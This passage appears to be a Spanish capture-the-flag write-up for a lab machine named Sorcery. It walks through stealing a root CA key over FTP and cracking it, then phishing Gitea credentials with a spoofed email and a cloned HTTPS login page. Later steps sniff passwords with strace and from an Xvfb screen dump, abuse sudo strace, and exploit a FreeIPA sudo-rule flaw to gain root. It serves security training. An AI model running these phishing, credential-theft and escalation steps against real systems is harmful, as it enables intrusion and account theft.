Address: 172.19.0.2
```

Y luego otro del `mail` para tenerlos localizados las `IPs`.

```shell
nslookup mail
```

Info:

```
Server:		127.0.0.11
Address:	127.0.0.11#53

Non-authoritative answer:
Name:	mail
Address: 172.19.0.11
```

Sabiendo esto y volviendo a nuestro `kali` como tenemos ese `tunel` ya podremos conectarnos al `FTP` desde `proxychains` de esta forma:

```shell
proxychains4 -q ftp anonymous@172.19.0.2
```

Info:

```
Connected to 172.19.0.2.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Vamos a `fuzzear` a ver que vemos:

```
ftp> ls -la
229 Entering Extended Passive Mode (|||21109|)
150 Here comes the directory listing.
drwxr-xr-x    1 ftp      ftp          4096 Nov 07  2020 .
drwxr-xr-x    1 ftp      ftp          4096 Nov 07  2020 ..
drwxrwxrwx    2 ftp      ftp          4096 Oct 31  2024 pub
^C
receive aborted. Waiting for remote to finish abort.
226 Directory send OK.
500 Unknown command.
180 bytes received in 01:21 (0.00 KiB/s)
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||21103|)
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Oct 31  2024 .
drwxr-xr-x    1 ftp      ftp          4096 Nov 07  2020 ..
-rwxrwxrwx    1 ftp      ftp             0 Sep 04  2024 .gitkeep
-rw-r--r--    1 ftp      ftp          1826 Oct 31  2024 RootCA.crt
-rw-r--r--    1 ftp      ftp          3434 Oct 31  2024 RootCA.key
^C
receive aborted. Waiting for remote to finish abort.
226 Directory send OK.
500 Unknown command.
321 bytes received in 00:01 (0.18 KiB/s)
```

Veremos que efectivamente estan los certificados que vimos en la ruta del `docker-compose`, por lo que vamos a descargarnoslo a nuestra maquina atacante de esta forma:

```shell
get RootCA.crt
get RootCA.key
```

Info:

```
local: RootCA.crt remote: RootCA.crt
229 Entering Extended Passive Mode (|||21104|)
150 Opening BINARY mode data connection for RootCA.crt (1826 bytes).
100% |************************************************************************************************************************************************|  1826        0.44 KiB/s    00:00 ETA^C
receive aborted. Waiting for remote to finish abort.
226 Transfer complete.
500 Unknown command.
1826 bytes received in 00:04 (0.37 KiB/s)
local: RootCA.key remote: RootCA.key
229 Entering Extended Passive Mode (|||21107|)
150 Opening BINARY mode data connection for RootCA.key (3434 bytes).
100% |************************************************************************************************************************************************|  3434        1.11 KiB/s    00:00 ETA^C
receive aborted. Waiting for remote to finish abort.
226 Transfer complete.
500 Unknown command.
3434 bytes received in 00:03 (0.87 KiB/s)
```

Echo esto vamos a configurar nuestro `foxyproxy` para poder acceder a la web de `mail` tal y como vemos en nuestro `docker-compose`.

<figure><img src="../../.gitbook/assets/Pasted image 20251223213405.png" alt=""><figcaption></figcaption></figure>

Configurandolo de esta forma, si seleccionamos dicha opcion de `Socks` y accedemos a esta `IP` y puerto...

```
URL = http://172.19.0.11:8025/
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251223213517.png" alt=""><figcaption></figcaption></figure>

Vemos que ha cargado de forma correcta la pagina, por lo que podremos enviar `emails` atraves del puerto `1025` que es el que se utiliza para enviar los `emails` en este caso y desde el puerto `8025` podremos visualizar dichos `emails`.

### CREAR PÁGINA PHISHING GITEA/CONFIGURAR SERVIDOR WEB CON SSL

Tambien estamos descubriendo un posible usuario llamado `tom_summers`, a parte de que si nos vamos a la pagina de `sorcery` y nos vamos a `Blog` leeremos lo siguiente:

```
Capacitación sobre phishing 

Hola, solo quiero hacer un breve resumen de la capacitación sobre phishing que tuvimos la semana pasada. Recuerden no abrir ningún enlace del correo electrónico a menos que: a) el enlace provenga de uno de nuestros dominios (diseo.sorcery.htb); b) el sitio web use HTTPS; c) el subdominio use nuestra RootCA (la clave privada se almacena de forma segura en nuestro servidor FTP, por lo que no puede ser pirateada). 

Concienciación sobre phishing 

Hubo una campaña de phishing que utilizó nuestra instancia de Gitea. Todos nuestros empleados, excepto uno (te estoy mirando, @tom_summers), aprobaron la prueba. Desafortunadamente, Tom ingresó sus credenciales, pero nuestro equipo de seguridad informática revocó rápidamente el acceso y cambió la contraseña. ¡Tom, asegúrate de que eso no vuelva a suceder! ¡Sigue las reglas de la otra publicación!
```

Esto nos da a entender que podemos enviar un `email` creando un `phishing` en el que cuando el `bot` que este por detras pinche en dicho `link` le reenvie a una pagina `phishing` nuestra que estara corriendo en la maquina atacante con todas las condiciones que pide ese mensaje, utilizaremos el dominio `diseo.sorcery.htb` el cual creamos anteriormente para que eso funcione y tambien firmaremos `HTTPS` con las claves obtenidas del servidor `FTP` para que funcione todo.

Primero instalaremos una herramienta que necesitaremos para enviar el `email`.

```shell
sudo apt install swaks
```

Ahora vamos a preparar nuestro servidor atacante de `python3` de esta forma:

> server.py

```python
# https_server.py
import http.server
import ssl
import os
import sys

# Configuración
CERT_FILE = 'RootCA.crt'
KEY_FILE = 'RootCA.key'
PORT = 443
DIRECTORIO = '.'  # Directorio actual (o cambia a donde tengas index.html)

# Crear el handler
handler = http.server.SimpleHTTPRequestHandler

# Crear servidor HTTP
httpd = http.server.HTTPServer(('0.0.0.0', PORT), handler)

# Configurar SSL
print(f"[*] Configurando HTTPS con:")
print(f"    Certificado: {CERT_FILE}")
print(f"    Clave: {KEY_FILE}")
print(f"    Puerto: {PORT}")
print(f"    Directorio: {DIRECTORIO}")

try:
    # Crear contexto SSL
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    
    # Envolver el socket con SSL
    httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
    
    print(f"\n[+] Servidor HTTPS iniciado")
    print(f"[+] URL: https://diseo.sorcery.htb")
    print(f"[+] Sirviendo archivos desde: {os.path.abspath(DIRECTORIO)}")
    print(f"[+] Archivos disponibles:")
    for f in os.listdir(DIRECTORIO):
        if f.endswith('.html') or f.endswith('.htm'):
            print(f"    - {f}")
    print(f"\n[*] Presiona Ctrl+C para detener")
    
    # Cambiar al directorio
    os.chdir(DIRECTORIO)
    
    # Iniciar servidor
    httpd.serve_forever()
    
except PermissionError:
    print(f"\n[!] Error: Necesitas ser root para puerto 443")
    print(f"[*] Usa: sudo python3 https_server.py")
    print(f"[*] O cambia PORT a 8443 en el código")
except FileNotFoundError as e:
    print(f"\n[!] Error: Archivo no encontrado - {e}")
except Exception as e:
    print(f"\n[!] Error: {e}")
```

Antes de ejecutarlo tendremos que saber la contraseña del `.key`, si observamos el tipo de archivo que es el `.crt` veremos que es `PEM`, por lo que podremos deducir que tambien lo sera el `.key`, si buscamos un poco encontraremos el siguiente repo en internet.

URL = [pemcrack GitHub Tool](https://github.com/robertdavidgraham/pemcrack)

Vamos a descargarnos el repo y compilarlo nosotros.

```shell
git clone https://github.com/robertdavidgraham/pemcrack.git
cd pemcrack/
# Tendremos que añadir una cosa al archivo ".c"
nano pemcrack.c

#Dentro del nano
............<RESTO_DE_CONTENIDO>...............
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
............<RESTO_DE_CONTENIDO>...............
# Lo guardamos (Ctrl+X -> Y -> ENTER)

gcc pemcrack.c -o pemcrack -lssl -lcrypto
```

Una vez compilado, lo ejecutaremos de esta forma:

```shell
./pemcrack RootCA.key <WORDLIST>
```

Info:

```
--- pemcrack v1.0 - by Robert Graham ----
-> 123456
found: password
```

Veremos que ha funcionado, la contraseña del certificado sera `password`, por lo que ahora si podremos firmarlo con el `HTTPS` para nuestra pagina, ahora vamos a ejecutarlo de esta forma nuestro servidor del atacante:

```shell
python3 server.py
```

Metemos como contraseña `password`...

```
[*] Configurando HTTPS con:
    Certificado: RootCA.crt
    Clave: RootCA.key
    Puerto: 443
    Directorio: .
Enter PEM pass phrase:

[+] Servidor HTTPS iniciado
[+] URL: https://diseo.sorcery.htb
[+] Sirviendo archivos desde: /home/diseo/Desktop/sorcery/certs
[+] Archivos disponibles:
    - index.html

[*] Presiona Ctrl+C para detener
```

Y tendremos que descargarnos el `index.html` del `login` de `Gitea` ya que tiene que ser identico al `Gitea` tal y como pone en el mensaje del `Blog`, por lo que daremos `click derecho` en la pagina del `login` (`https://git.sorcery.htb/user/login`) le daremos a `Save Page...` y lo llevaremos a la ruta de donde tengamos el servidor de `python3` llamandolo `index.html`, despues dentro del `index.html` modificaremos el `action=...` de `post` a `get`, para que nos lleguen las credenciales a nosotros.

Mientras esto esta a la escucha, vamos a enviar el `email` de esta forma:

```shell
proxychains4 -q swaks \
  --to tom_summers@sorcery.htb \
  --from "admin@sorcery.htb" \
  --server 172.19.0.11:1025 \
  --h-Subject "Important: Git Service Migration" \
  --body "Dear user,\n\nOur Git service has been migrated to https://diseo.sorcery.htb/index.html\nPlease login with your credentials.\n\nIT Department"
```

Info:

```
=== Trying 172.19.0.11:1025...
=== Connected to 172.19.0.11.
<-  220 mailhog.example ESMTP MailHog
 -> EHLO kali
<-  250-Hello kali
<-  250-PIPELINING
<-  250 AUTH PLAIN
 -> MAIL FROM:<admin@sorcery.htb>
<-  250 Sender admin@sorcery.htb ok
 -> RCPT TO:<tom_summers@sorcery.htb>
<-  250 Recipient tom_summers@sorcery.htb ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Wed, 24 Dec 2025 11:22:13 +0100
 -> To: tom_summers@sorcery.htb
 -> From: admin@sorcery.htb
 -> Subject: Important: Git Service Migration
 -> Message-Id: <20251224112213.034489@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 ->
 -> Dear user,
 ->
 -> Our Git service has been migrated to https://diseo.sorcery.htb/index.html
 -> Please login with your credentials.
 ->
 -> IT Department
 ->
 -> .
<-  250 Ok: queued as qkyvrsTf85eLnBw39rnGO33Td8qLZlG--mbkvYENMIk=@mailhog.example
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

Ahora si volvemos a la pagina de la bandeja de `emails` veremos que ha funcionado, ya que veremos nuestro `email`:

<figure><img src="../../.gitbook/assets/Pasted image 20251224120038.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20251224120053.png" alt=""><figcaption></figcaption></figure>

Por lo que tendremos que esperar un poco a que dicho `bot` que este por detras pinche en nuestro `link`.

Despues de un rato veremos lo siguiente:

```
10.10.11.73 - - [24/Dec/2025 12:35:06] "GET /index.html HTTP/1.1" 200 -
10.10.11.73 - - [24/Dec/2025 12:35:06] "GET /index_files/webcomponents.js HTTP/1.1" 200 -
10.10.11.73 - - [24/Dec/2025 12:35:06] "GET /index_files/index.css HTTP/1.1" 200 -
10.10.11.73 - - [24/Dec/2025 12:35:06] "GET /index_files/theme-gitea-auto.css HTTP/1.1" 200 -
10.10.11.73 - - [24/Dec/2025 12:35:06] "GET /index_files/index.js HTTP/1.1" 200 -
10.10.11.73 - - [24/Dec/2025 12:35:06] "GET /index_files/logo.svg HTTP/1.1" 200 -
10.10.11.73 - - [24/Dec/2025 12:35:16] code 404, message File not found
10.10.11.73 - - [24/Dec/2025 12:35:16] "GET /user/login?_csrf=_0HBhEcsdIcQRw-FvSgDe_Pp_Kg6MTc2NjU3NTMyMTY1MTAzODAwNQ&user_name=tom_summers&password=jNsMKQ6k2.XDMPu. HTTP/1.1" 404 -
```

Veremos que ha funcionado, por lo que tendremos las credenciales.

```
User: tom_summers
Pass: jNsMKQ6k2.XDMPu.
```

### SSH (tom\_summers)

Vamos a probarlas por `SSH`.

```shell
ssh tom_summers@<IP>
```

Metemos como contraseña `jNsMKQ6k2.XDMPu.`...

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Dec 24 11:40:26 2025 from 10.10.14.25
tom_summers@main:~$ whoami
tom_summers
```

Con esto veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
71ed48252511ecce648181e35ac8e960
```

## Escalate user tom\_summers\_admin

Si listamos los procesos...

```shell
ss -tuln
```

Info:

```
Netid              State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port              Process
udp                UNCONN              0                   0                                   127.0.0.54:53                                  0.0.0.0:*
udp                UNCONN              0                   0                                127.0.0.53%lo:53                                  0.0.0.0:*
udp                UNCONN              0                   0                                    127.0.0.1:88                                  0.0.0.0:*
udp                UNCONN              0                   0                                    127.0.0.1:323                                 0.0.0.0:*
udp                UNCONN              0                   0                                    127.0.0.1:464                                 0.0.0.0:*
udp                UNCONN              0                   0                                        [::1]:323                                    [::]:*
tcp                LISTEN              0                   4096                                   0.0.0.0:443                                 0.0.0.0:*
tcp                LISTEN              0                   4096                                 127.0.0.1:636                                 0.0.0.0:*
tcp                LISTEN              0                   4096                                 127.0.0.1:5000                                0.0.0.0:*
tcp                LISTEN              0                   4096                                 127.0.0.1:88                                  0.0.0.0:*
tcp                LISTEN              0                   4096                                 127.0.0.1:464                                 0.0.0.0:*
tcp                LISTEN              0                   4096                                 127.0.0.1:389                                 0.0.0.0:*
tcp                LISTEN              0                   4096                                127.0.0.54:53                                  0.0.0.0:*
tcp                LISTEN              0                   4096                             127.0.0.53%lo:53                                  0.0.0.0:*
tcp                LISTEN              0                   4096                                         *:22                                        *:*
tcp                LISTEN              0                   4096                                      [::]:443                                    [::]:*
```

Veremos bastante interesante algunos puertos como por ejemplo `88` que pertenece a `Kerberos`, con esto nos da a entender que se esta utilizando un `Active Directory` pero en `Linux` o tambien llamado `FreeIPA`.

Si intentamos enumerar dichos usuarios del dominio de esta forma:

```shell
ipa user-find --all
```

Info:

```
ipa: ERROR: did not receive Kerberos credentials
```

Veremos que requerimos de las credenciales a nivel de `dominio`, lo dejaremos un poco de lado, ya que no podemos actualmente.

Vamos a ver que version tiene `FreeIPA` de esta forma:

```shell
ipa --version 2>/dev/null
```

Info:

```
VERSION: 4.11.1, API_VERSION: 2.253
```

Si buscamos en internet esta misma version, veremos que tiene un `CVE` asociado a el mismo.

URL = [Info CVE-2025-7493](https://github.com/advisories/GHSA-vm59-52f9-r52r)

Esta vulnerabilidad permite que **usuarios regulares puedan añadirse a sí mismos a reglas de sudo** debido a una validación incorrecta de permisos en FreeIPA. Específicamente:

* **Vulnerabilidad**: Validación insuficiente al añadir usuarios a reglas sudo
* **Impacto**: Escalada de privilegios a root
* **Componente**: `ipa sudorule-add-user`

Pero necesitamos un usuario de dominio, en este caso vemos que seria el llamado `ash_winter`, pero tras investigar un rato no encontre nada, si tiramos un `linpeas.sh` veremos lo siguiente:

```
tom_sum+    1478  0.0  0.7 227012 60528 ?        S    13:17   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
```

Vemos que nos marca en `amarillo` (Unas probabilidades muy altas de ser explotado) el `-screen`, si investigamos sobre ello veremos que podemos explotarlo de una forma ya que este se esta ejecutando como el usuario `tom_summers_admin`.

Esto lo que significa es que se esta compariendo una pantalla en este caso la `1`, vamos a intentar visualizar lo que se esta compartiendo, por lo que vamos a buscar donde esta el archivo donde se almacena la captura de pantalla.

Buscando veremos la siguiente ruta:

```shell
ls -la /xorg/xvfb
```

Info:

```
-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Dec 24 13:17 Xvfb_screen0
```

Vemos que es la pantalla la cual queremos ver, por lo que vamos a pasarnos el archivo por un servidor de `python3`, una vez echo eso, vamos a visualizarlo de esta forma:

```shell
export DISPLAY=:0
xwud -in Xvfb_screen0
```

Si hacemos eso, tendremos que ver lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251224161442.png" alt=""><figcaption></figcaption></figure>

Por lo que vemos son unas credenciales del usuario `tom_summers_admin`, vamos a probarlas.

```shell
su tom_summers_admin
```

Metemos como contraseña `dWpuk7cesBjT-`...

```
tom_summers_admin@main:~$ whoami
tom_summers_admin
```

Veremos que funciono y seremos dicho usuario.

## Escalate user rebecca\_smith

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

Vemos que podemos ejecutar `2` binarios como el usuario `rebecca_smith`, ya de primeras nos llama la atencion ese `*`, por lo que se me ocurrio ir a `GTFObins` para ver que podemos hacer con dicho binario, ya que podemos ejecutar lo que queramos despues del `-p`.

### Forma 1

Veremos que podemos escalar a `rebecca_smith` con el `-o` de esta forma:

```shell
sudo -u rebecca_smith /usr/bin/strace -s 128 -p <PID_CUALQUIRA> -o /dev/null /bin/bash
```

Info:

```
rebecca_smith@main:/home/tom_summers_admin$ whoami
rebecca_smith
```

Vemos que ha funcionado, por lo que seremos dicho usuario.

### Forma 2

Vamos a utilizar los `2` binarios para escuchar todo lo que pase cuando ejecutamos el `docker login` de esta forma con un bucle.

```shell
while true; do pid=$(pgrep docker -u rebecca_smith 2>/dev/null) &&break; done; sudo -u rebecca_smith strace -s 128 -p $pid -f -e trace=read
```

Mientras esto esta a la escucha de cualquier proceso `docker` por el usuario `rebecca_smith`, vamos en otra terminal a ejecutar el `docker login`.

```shell
sudo -u rebecca_smith /usr/bin/docker login
```

Ahora si esperamos unos segundos, veremos lo siguiente en el bucle:

```
...............................<RESTO DE INFO>.....................................
[pid 342148] read(34, "\357@0\325\375N]s", 8) = 8
strace: Process 342155 attached
[pid 342155] read(35,  <unfinished ...>
[pid 342148] read(37, "{\"ServerURL\":\"https://index.docker.io/v1/\",\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 4096) = 96
[pid 342148] read(34, "\225\245\371/", 4) = 4
[pid 342148] read(60, "^\376\2768y\3\356\265\33!z-\202\267\302\252", 16) = 16
[pid 342148] read(64, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0@\0\0\0\0\0\0\0\200\231\n\0\0\0\0\0\0\0\0\0@\08\0\v\0@\0\35\0\34\0\1\0\0\0\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\300\334\1\0\0\0\0\0\300\334\1\0\0\0\0\0\0\20\0\0\0\0\0\0\1\0\0\0\5\0\0\0"..., 832) = 832
...............................<RESTO DE INFO>.....................................
```

Vemos en `secret` la contraseña de `rebecca_smith` que seria `-7eAZDp9-f9mg`.

## Escalate user ash\_winter

Si investigamos con `LDAP` los usuarios de dominio que hay, vemos uno bastante interesante llamado `ash_winter`:

```shell
ldapsearch -x -H ldap://127.0.0.1 -b "cn=users,cn=accounts,dc=sorcery,dc=htb" "(&(objectClass=posixAccount)(uidNumber>=1000))" 2>/dev/null | \
grep -E "^(uid:|uidNumber:|givenName:|sn:)"
```

Info:

```
uid: admin
sn: Administrator
uidNumber: 1638400000
givenName: donna
sn: adams
uid: donna_adams
uidNumber: 1638400003
givenName: ash
sn: winter
uid: ash_winter
uidNumber: 1638400004
```

Vamos investigar los procesos a ver que vemos...

```shell
old=$(ps -eo user,cmd); while true; do new=$(ps -eo user,cmd); diff <(echo "$old") <(echo "$new") | grep -E "<|>" | grep -Ev "kworker"; old=$new; done
```

Info:

```
> admin    /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
```

Veremos un proceso bastante curioso relacionado con el usuario `ash_winter` que observamos anteriormente, teniendo sus credenciales.

Una vez que tengamos las credenciales del usuario de dominio `ash_winter` vamos a solicitar un `Ticket` de `Kerberos` de dicho usuario.

```shell
kinit ash_winter
```

Metemos las credenciales obtenidas y si verificamos nuestro `klist`...

```shell
klist
```

Info:

```
Ticket cache: KEYRING:persistent:2003:2003
Default principal: ash_winter@SORCERY.HTB

Valid starting     Expires            Service principal
12/25/25 10:59:34  12/26/25 10:26:40  krbtgt/SORCERY.HTB@SORCERY.HTB
```

Veremos que ha funcionado, por lo que ya podremos utilizar los privilegios de `ash_winter`.

## Escalate Privileges

Siguiendo el metodo del `CVE` que nos encontramos anteriormente, pondremos este comando para agregarnos al grupo llamado `sysadmins`.

```shell
ipa group-add-member sysadmins --users=ash_winter
```

Info:

```
Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
-------------------------
Number of members added 1
-------------------------
```

Vemos que ha funcionado, seguiremos el siguiente paso que sera agregara dicho usuario a la regla llamada `allow_sudo`, si buscamos las reglas veremos que se llama asi, pero en el `PoC` del `CVE` ya nos lo dice directamente.

```shell
ipa sudorule-add-user allow_sudo --users=ash_winter
```

Info:

```
Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin, ash_winter
-------------------------
Number of members added 1
-------------------------
```

Veremos que tambien ha funcionado, vamos a trabajar desde el propio usuario de esta forma:

```shell
ssh ash_winter@<IP>
```

Metemos como contraseña `w@LoiU8Crmdep`...

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-sh: 32: [[: not found
-sh: 32: Thu Dec 25 11:21:21 2025: not found
Last login: Thu Dec 25 11:21:21 2025 from 10.10.14.25
$ whoami
ash_winter
```

Teniendo una `shell` dentro como dicho usuario, vamos a verificar nuestros privilegios, si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
```

Vemos que podemos reiniciar el servicio de `sssd`, el cual vamos a reiniciar despues de haber echo los cambios anteriores para que se apliquen de forma correcta:

```shell
sudo systemctl restart sssd
```

Para que se apliquen los cambios en la `shell`, tendremos que salirnos y volver a entrar, para que surja efecto, hecho eso probaremos a listar los privilegios `sudo -l`:

```
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL
```

Vemos que tenemos todos los privilegios.

```shell
sudo su -
```

Info:

```
root@main:~# whoami
root
```

Con esto ya seremos `root`, por lo que podremos leer la `flag` de `root`.

> root.txt

```
3d6f65dea019ee2606cb94f7ecf2bc2d
```
